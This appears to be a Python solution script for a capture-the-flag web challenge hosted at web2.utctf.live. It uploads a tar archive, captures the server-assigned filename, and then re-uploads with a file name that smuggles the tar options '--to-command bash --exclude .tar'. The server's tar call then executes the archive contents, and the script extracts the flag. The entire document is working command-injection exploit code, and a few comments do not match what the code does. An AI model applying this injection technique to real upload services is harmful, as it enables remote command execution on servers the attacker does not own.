import requests
import re

url = "http://web2.utctf.live:8123"

# Function to upload tar file with payload as name
def send_payload(payload):
    files = {'file': (payload, open('exploit.tar','rb'))}
    r = requests.post(url + "/upload", files=files)
    return r.text

# Upload a file with commands.txt
res = send_payload("sploit13.tar")

# Retrieve the uploaded file name 
filename = re.findall("Filename\:\ (.*?)<\/p>", res)[0]
print("New filename: ", filename)

# Send the exploit file with the retrieved file name
exploit = "%s --to-command bash --exclude .tar" %filename
res = send_payload(exploit)

# Print flag
print("utctf{%s}" %re.findall("utflag{(.*?)}", res)[0])

